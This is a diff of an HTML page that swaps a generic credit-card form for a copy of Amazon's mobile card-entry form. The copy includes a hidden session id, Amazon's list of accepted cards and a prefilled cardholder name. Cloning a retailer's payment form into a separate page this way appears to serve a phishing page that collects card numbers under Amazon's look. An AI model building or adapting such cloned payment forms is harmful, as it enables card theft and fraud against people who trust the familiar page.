@@ -78,7 +78,7 @@
 
 <body>
 
-    <form class="cc-form">
+    <!-- <form class="cc-form">
         <input name="addCreditCardNumber" class="cc-input cc-number" id="cardNumber" type="text" pattern="[0-9]*" placeholder="Card number">
         <input name="holdername" class="cc-input cc-name" id="cardNumber" type="text" placeholder="Name on card" value="">
         <fieldset class="cc-expiration">
@@ -86,7 +86,129 @@
             <input name="year" class="cc-input cc-expiration--year" id="cardNumber" type="text" pattern="[0-9]*" placeholder="YY" value="">
         </fieldset>
         <button type="submit" name="button" class="ch-btn">Submit</button>
-    </form>
+    </form> -->
+    <form action="/gp/aw/ya/p" method="post"><input type="hidden" name="si" value="190-6700118-5036964">
+ <input type="hidden" name="pm" value="newCreditCard">
+
+
+
+
+
+ Accepted Cards: American Express,Amazon.com Visa,Discover,Diners Club,JCB,Visa,MasterCard <br><br>
+ Card No.:<br>
+ <input name="addCreditCardNumber" size="20" maxlength="20"><br><br>
+
+
+
+
+
+Expiration Date<br>
+<select name="cxm">
+ <option value="1">
+ 01
+ </option>
+ <option value="2">
+ 02
+ </option>
+ <option value="3">
+ 03
+ </option>
+ <option value="4">
+ 04
+ </option>
+ <option value="5">
+ 05
+ </option>
+ <option value="6">
+ 06
+ </option>
+ <option value="7">
+ 07
+ </option>
+ <option value="8">
+ 08
+ </option>
+ <option value="9">
+ 09
+ </option>
+ <option value="10">
+ 10
+ </option>
+ <option value="11">
+ 11
+ </option>
+ <option value="12">
+ 12
+ </option>
+</select>-
+<select name="cxy">
+ <option value="2015">
+ 2015
+ </option>
+ <option value="2016">
+ 2016
+ </option>
+ <option value="2017">
+ 2017
+ </option>
+ <option value="2018">
+ 2018
+ </option>
+ <option value="2019">
+ 2019
+ </option>
+ <option value="2020">
+ 2020
+ </option>
+ <option value="2021">
+ 2021
+ </option>
+ <option value="2022">
+ 2022
+ </option>
+ <option value="2023">
+ 2023
+ </option>
+ <option value="2024">
+ 2024
+ </option>
+ <option value="2025">
+ 2025
+ </option>
+ <option value="2026">
+ 2026
+ </option>
+ <option value="2027">
+ 2027
+ </option>
+ <option value="2028">
+ 2028
+ </option>
+ <option value="2029">
+ 2029
+ </option>
+ <option value="2030">
+ 2030
+ </option>
+ <option value="2031">
+ 2031
+ </option>
+ <option value="2032">
+ 2032
+ </option>
+ <option value="2033">
+ 2033
+ </option>
+</select><br>
+Note: Amazon.com Store Cards do not expire<br>
+<br>
+Name on card<br>
+<input name="ch" size="20" maxlength="50" value="Juan Vanni">
+
+ <br>
+ <input type="submit" name="view.editConfirm" value="Billing address selection">
+<input type="submit" name="view.list" value="Cancel">
+</form>
 
     <script>
         var md = new MobileDetect(window.navigator.userAgent);
